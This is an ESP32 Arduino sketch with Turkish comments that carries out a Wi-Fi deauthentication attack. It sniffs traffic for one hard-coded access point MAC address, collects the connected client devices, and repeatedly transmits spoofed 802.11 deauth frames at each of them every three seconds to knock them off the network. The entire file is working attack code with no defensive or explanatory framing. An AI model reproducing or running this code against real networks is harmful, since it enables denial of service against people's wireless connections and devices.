#include <WiFi.h>
#include "esp_wifi.h"

#define TARGET_AP_MAC_LEN 6
#define MAX_CLIENTS 20

// Hedef AP'nin MAC adresini buraya yaz
uint8_t targetAPMac[TARGET_AP_MAC_LEN] = {0xC4, 0x3D, 0x1A, 0xAB, 0xA5, 0x81};  //C4-3D-1A-AB-A5-81

// Bulunan bağlı cihazların MAC adreslerini tutar
uint8_t clientMacs[MAX_CLIENTS][6];
int clientCount = 0;

// Hangi client'a en son deauth gönderildiği takibi
unsigned long lastDeauthTime[MAX_CLIENTS] = {0};

const unsigned long DEAUTH_INTERVAL = 3000; // Her cihaza 3 sn'de bir deauth gönder

bool isClientKnown(const uint8_t *mac) {
  for (int i = 0; i < clientCount; i++) {
    bool same = true;
    for (int j = 0; j < 6; j++) {
      if (clientMacs[i][j] != mac[j]) {
        same = false;
        break;
      }
    }
    if (same) return true;
  }
  return false;
}

void addClient(const uint8_t *mac) {
  if (clientCount >= MAX_CLIENTS) return;
  if (isClientKnown(mac)) return;
  memcpy(clientMacs[clientCount], mac, 6);
  lastDeauthTime[clientCount] = 0;
  clientCount++;
  Serial.print("Yeni cihaz bulundu: ");
  for (int i = 0; i < 6; i++) {
    Serial.printf("%02X", mac[i]);
    if (i < 5) Serial.print(":");
  }
  Serial.println();
}

void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buf;
  const uint8_t *payload = ppkt->payload;

  uint8_t frame_ctrl0 = payload[0];
  uint8_t frame_type = (frame_ctrl0 & 0x0C) >> 2;

  if (frame_type == 2) { // Sadece data frame
    const uint8_t *addr1 = payload + 4;   // Destination MAC
    const uint8_t *addr2 = payload + 10;  // Source MAC
    const uint8_t *addr3 = payload + 16;  // BSSID

    if (memcmp(addr3, targetAPMac, 6) == 0) {
      addClient(addr2);
    }
    else if (memcmp(addr1, targetAPMac, 6) == 0) {
      addClient(addr2);
    }
  }
}

void sendDeauth(const uint8_t *targetMac) {

  uint8_t deauthPacket[26] = {
    0xC0, 0x00,             // Frame control: deauth
    0x00, 0x00,             // Duration
    // Destination MAC (target cihaz)
    targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5],
    // Source MAC (AP)
    targetAPMac[0], targetAPMac[1], targetAPMac[2], targetAPMac[3], targetAPMac[4], targetAPMac[5],
    // BSSID (AP)
    targetAPMac[0], targetAPMac[1], targetAPMac[2], targetAPMac[3], targetAPMac[4], targetAPMac[5],
    0x00, 0x00,             // Sequence number
    0x07, 0x00              // Reason code
  };
  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
  Serial.print("Deauth gönderildi: ");
  for (int i = 0; i < 6; i++) {
    Serial.printf("%02X", targetMac[i]);
    if (i < 5) Serial.print(":");
  }
  Serial.println();
}

void setup() {
  Serial.begin(115200);
  delay(500);
  WiFi.mode(WIFI_MODE_NULL); // WiFi kapalı
  esp_wifi_set_promiscuous(true); // Sniffer aktif
  esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
  esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE); // AP kanalına ayarla
  Serial.println("Sniffer mod aktif, cihazları arıyor ve otomatik deauth gönderiyor...");
}

void loop() {
  unsigned long now = millis();
  if (clientCount == 0) {
    Serial.println("Henüz cihaz bulunamadı, bekleniyor...");
    delay(2000);
    return;
  }

  // Her bulduğu client'a periyodik olarak deauth gönder
  for (int i = 0; i < clientCount; i++) {
    if (now - lastDeauthTime[i] > DEAUTH_INTERVAL) {
      sendDeauth(clientMacs[i]);
      lastDeauthTime[i] = now;
    }
  }
  delay(100); // CPU'yu fazla yorma
}